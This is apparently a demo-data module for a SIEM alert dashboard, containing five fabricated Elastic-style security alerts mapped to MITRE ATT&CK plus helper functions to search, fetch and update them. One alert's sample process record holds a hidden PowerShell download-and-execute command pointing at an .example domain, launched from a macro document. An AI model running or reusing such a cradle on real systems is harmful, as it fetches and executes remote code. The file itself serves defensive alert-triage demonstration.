'use strict';
/**
 * Data contoh untuk DEMO_MODE=true. Semua IP memakai rentang dokumentasi (RFC 5737)
 * dan domain .example, jadi tidak menunjuk ke infrastruktur nyata.
 */
const { flatten } = require('./extract');

const MIN = 60 * 1000;
const base = Date.now();
const ts = (minAgo) => new Date(base - minAgo * MIN).toISOString();

const TACTIC_ID = { Discovery: 'TA0007', Execution: 'TA0002', 'Credential Access': 'TA0006', 'Initial Access': 'TA0001', 'Command and Control': 'TA0011' };
/** Bentuk sama dengan rule Elastic asli: threat[].tactic + technique[].subtechnique[] */
function threatOf(rule) {
  const sub = rule.techId.includes('.');
  const tech = sub
    ? { id: rule.techId.split('.')[0], name: rule.parent || rule.technique, subtechnique: [{ id: rule.techId, name: rule.technique }] }
    : { id: rule.techId, name: rule.technique, subtechnique: [] };
  return [{ framework: 'MITRE ATT&CK', tactic: { id: TACTIC_ID[rule.tactic], name: rule.tactic }, technique: [tech] }];
}

function alert(id, minAgo, rule, severity, risk, reason, extra) {
  return {
    _id: id,
    _source: {
      '@timestamp': ts(minAgo),
      kibana: {
        alert: {
          uuid: id,
          workflow_status: 'open',
          severity,
          risk_score: risk,
          reason,
          rule: {
            name: rule.name,
            description: rule.description,
            tags: rule.tags || [],
            references: rule.references || [],
            threat: threatOf(rule),
          },
        },
      },
      ...extra,
    },
  };
}

const ALERTS = [
  alert('demo-0001', 12, {
    name: 'Fortinet - Inbound Port Scan from External Host',
    description: 'Satu IP eksternal mencoba banyak port tujuan dalam waktu singkat.',
    tags: ['Fortinet', 'Network', 'Discovery'], tactic: 'Discovery', technique: 'Network Service Discovery', techId: 'T1046',
  }, 'high', 73, 'network event with source 203.0.113.45 by fw-edge-01 created high alert',
  {
    source: { ip: '203.0.113.45', port: 51822, geo: { country_name: 'Exampleland' } },
    destination: { ip: '10.10.20.15', port: 3389 },
    network: { transport: 'tcp', direction: 'inbound', bytes: 4120 },
    event: { dataset: 'fortinet_fortigate.log', module: 'fortinet_fortigate', action: 'deny', category: ['network'], outcome: 'failure' },
    host: { name: 'fw-edge-01' },
    message: 'date=2026-10-28 devname="fw-edge-01" action=deny srcip=203.0.113.45 dstip=10.10.20.15 dstport=3389 proto=6 service=RDP',
  }),
  alert('demo-0002', 38, {
    name: 'M365 Defender - Suspicious PowerShell Download Cradle',
    description: 'PowerShell mengunduh dan menjalankan konten dari domain eksternal.',
    tags: ['Microsoft 365 Defender', 'Execution'], tactic: 'Execution', technique: 'PowerShell', parent: 'Command and Scripting Interpreter', techId: 'T1059.001',
  }, 'critical', 91, 'process powershell.exe by it.budi on WS-FIN-07 created critical alert',
  {
    source: { ip: '10.10.30.77' },
    destination: { ip: '198.51.100.23', port: 443, domain: 'update-check.example' },
    host: { name: 'WS-FIN-07', os: { name: 'Windows 11' }, ip: ['10.10.30.77'] },
    user: { name: 'it.budi', domain: 'CORP' },
    process: {
      name: 'powershell.exe', pid: 7312,
      executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      command_line: 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'https://update-check.example/a.ps1\')"',
      parent: { name: 'winword.exe', command_line: '"WINWORD.EXE" /n "C:\\Users\\it.budi\\Downloads\\invoice_okt.docm"' },
      hash: { sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08' },
    },
    file: { name: 'invoice_okt.docm', path: 'C:\\Users\\it.budi\\Downloads\\invoice_okt.docm' },
    event: { dataset: 'microsoft_defender_endpoint.log', module: 'microsoft_defender_endpoint', category: ['process'], action: 'start' },
    network: { transport: 'tcp', direction: 'outbound' },
  }),
  alert('demo-0003', 95, {
    name: 'Sangfor - Brute Force Login to VPN Portal',
    description: 'Banyak kegagalan login VPN dari satu sumber dalam 5 menit.',
    tags: ['Sangfor', 'Credential Access'], tactic: 'Credential Access', technique: 'Brute Force', techId: 'T1110',
  }, 'medium', 47, 'authentication event with source 198.51.100.77 created medium alert',
  {
    source: { ip: '198.51.100.77', port: 40211 },
    destination: { ip: '10.10.1.5', port: 443 },
    user: { name: 'admin' },
    host: { name: 'sangfor-vpn-01' },
    event: { dataset: 'sangfor.log', module: 'sangfor', category: ['authentication'], action: 'login', outcome: 'failure' },
    network: { transport: 'tcp', direction: 'inbound' },
    message: 'SSL VPN login failed user=admin src=198.51.100.77 reason=bad_password count=57',
  }),
  alert('demo-0004', 210, {
    name: 'M365 - Impossible Travel Sign-in',
    description: 'Dua sign-in sukses dari lokasi berjauhan dalam waktu tidak wajar.',
    tags: ['Microsoft 365', 'Initial Access'], tactic: 'Initial Access', technique: 'Valid Accounts', techId: 'T1078',
  }, 'high', 66, 'authentication event for siti.rahma created high alert',
  {
    source: { ip: '203.0.113.99', geo: { country_name: 'Exampleland' } },
    user: { name: 'siti.rahma', email: 'siti.rahma@corp.example' },
    event: { dataset: 'o365.audit', module: 'o365', category: ['authentication'], action: 'UserLoggedIn', outcome: 'success' },
    host: { name: 'o365-tenant' },
  }),
  alert('demo-0005', 400, {
    name: 'Fortinet - Outbound Connection to Rare Port',
    description: 'Host internal menghubungi IP eksternal pada port tidak umum.',
    tags: ['Fortinet', 'Command and Control'], tactic: 'Command and Control', technique: 'Non-Standard Port', techId: 'T1571',
  }, 'low', 21, 'network event with source 10.10.40.12 created low alert',
  {
    source: { ip: '10.10.40.12', port: 55012 },
    destination: { ip: '198.51.100.200', port: 4444 },
    network: { transport: 'tcp', direction: 'outbound', bytes: 880 },
    host: { name: 'fw-edge-01' },
    event: { dataset: 'fortinet_fortigate.log', module: 'fortinet_fortigate', action: 'accept', category: ['network'], outcome: 'success' },
  }),
];
// buat sebagian alert sudah berstatus lain agar filter terlihat berfungsi
ALERTS[3]._source.kibana.alert.workflow_status = 'acknowledged';
ALERTS[4]._source.kibana.alert.workflow_status = 'closed';

function summarize(a) {
  const f = flatten(a._source);
  const g = (k) => (Array.isArray(f[k]) ? f[k][0] : f[k]);
  return {
    id: a._id, timestamp: g('@timestamp'), rule: g('kibana.alert.rule.name'),
    severity: g('kibana.alert.severity'), risk_score: g('kibana.alert.risk_score'),
    status: g('kibana.alert.workflow_status'),
    source_ip: g('source.ip'), source_port: g('source.port'),
    destination_ip: g('destination.ip'), destination_port: g('destination.port'),
    host: g('host.name'), user: g('user.name'), dataset: g('event.dataset'), reason: g('kibana.alert.reason'),
  };
}

async function searchAlerts(p = {}) {
  let rows = ALERTS.map(summarize);
  if (p.severity) rows = rows.filter((r) => r.severity === p.severity);
  if (p.status) rows = rows.filter((r) => r.status === p.status);
  if (p.q) {
    const q = String(p.q).toLowerCase();
    rows = rows.filter((r) => JSON.stringify(r).toLowerCase().includes(q));
  }
  const off = parseInt(p.offset, 10) || 0;
  const sz = parseInt(p.size, 10) || 500;
  return { total: rows.length, alerts: rows.slice(off, off + sz) };
}

async function getAlert(id) {
  const a = ALERTS.find((x) => x._id === id);
  return a ? { id: a._id, source: a._source } : null;
}

async function relatedEvents({ ips = [], hosts = [], users = [] }) {
  const events = [];
  const mk = (i, minAgo, o) => events.push({ id: `evt-${i}`, index: 'logs-demo', timestamp: ts(minAgo), ...o });
  let i = 0;
  for (const ip of ips) {
    if (ip === '203.0.113.45') {
      [13, 14, 15, 16].forEach((m, k) => mk(i++, m, {
        dataset: 'fortinet_fortigate.log', action: 'deny', outcome: 'failure',
        source_ip: ip, source_port: 51800 + k, destination_ip: '10.10.20.15', destination_port: [22, 445, 3389, 8080][k],
        protocol: 'tcp', host: 'fw-edge-01', message: `deny ${ip} -> 10.10.20.15`,
      }));
    }
    if (ip === '198.51.100.23') {
      mk(i++, 39, { dataset: 'fortinet_fortigate.log', action: 'accept', outcome: 'success', source_ip: '10.10.30.77', source_port: 52111, destination_ip: ip, destination_port: 443, protocol: 'tcp', host: 'fw-edge-01', message: 'accept 10.10.30.77 -> update-check.example:443' });
    }
    if (ip === '198.51.100.77') {
      for (let k = 0; k < 4; k++) mk(i++, 96 + k, { dataset: 'sangfor.log', action: 'login', outcome: 'failure', source_ip: ip, destination_ip: '10.10.1.5', destination_port: 443, protocol: 'tcp', host: 'sangfor-vpn-01', user: 'admin', message: 'SSL VPN login failed user=admin' });
    }
  }
  for (const h of hosts) {
    if (h === 'WS-FIN-07') {
      mk(i++, 42, { dataset: 'microsoft_defender_endpoint.log', action: 'start', host: h, user: 'it.budi', process: 'winword.exe', message: 'Office macro enabled document opened' });
      mk(i++, 39, { dataset: 'microsoft_defender_endpoint.log', action: 'start', host: h, user: 'it.budi', process: 'powershell.exe', message: 'powershell.exe spawned by winword.exe' });
    }
  }
  for (const u of users) {
    if (u === 'siti.rahma') mk(i++, 215, { dataset: 'o365.audit', action: 'UserLoggedIn', outcome: 'success', source_ip: '198.51.100.12', user: u, message: 'Login from home country' });
  }
  return { total: events.length, events };
}

async function setAlertStatus(id, status) {
  const a = ALERTS.find((x) => x._id === id);
  if (a) a._source.kibana.alert.workflow_status = status === 'in-progress' ? 'acknowledged' : status;
  return { ok: true, demo: true };
}

async function health() {
  return { cluster: 'demo-cluster', version: 'demo' };
}

module.exports = { searchAlerts, getAlert, relatedEvents, setAlertStatus, health };
